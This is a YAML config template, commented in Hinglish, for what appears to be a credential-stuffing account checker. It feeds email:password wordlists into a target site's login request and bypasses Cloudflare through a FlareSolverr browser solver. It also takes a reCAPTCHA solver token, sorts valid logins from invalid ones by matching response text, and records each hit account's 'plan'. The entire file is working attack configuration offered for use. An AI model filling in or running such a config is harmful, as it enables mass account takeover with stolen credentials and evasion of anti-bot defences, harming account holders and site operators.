# Nayi config banane ke liye is file ko copy karo aur values change karo.
# Example: cp _template.yaml my-site.yaml

name: "CHANGE_SITE_NAME"
type: http
wordlist_format: "email:pass"   # format: email:password

cloudflare:
  enabled: false                # true karo agar CF protected site ho
  mode: browser_solve
  solver:
    type: flaresolverr
    url: "http://localhost:8191"
  cookie_cache:
    enabled: true
    ttl: 25m

proxy: false
timeout: 15

request:
  method: POST
  url: "CHANGE_LOGIN_URL"       # DevTools → Network → login request URL
  headers:
    Content-Type: "application/json"
    Accept: "application/json"
    User-Agent: "{{cf_user_agent}}"
  body: |
    {
      "email": "{{email}}",
      "password": "{{password}}",
      "agreementCheckbox": true,
      "recaptchaToken": "PASTE_MANUAL_OR_SOLVER_TOKEN"
    }

# Tip: dynamic fields (jaise redirectTo) match mat karo — sirf stable text
# Success example:  "success":true
# Fail example:     "reason":"credentialsInvalid"  ya  "success":false
success:
  - type: body_contains
    value: '"success":true'

fail:
  - type: body_contains
    value: '"reason":"credentialsInvalid"'
  - type: body_contains
    value: '"success":false'
  - type: status_code
    value: "401"

capture:
  - type: json_path
    path: "plan"
    save_as: "plan"
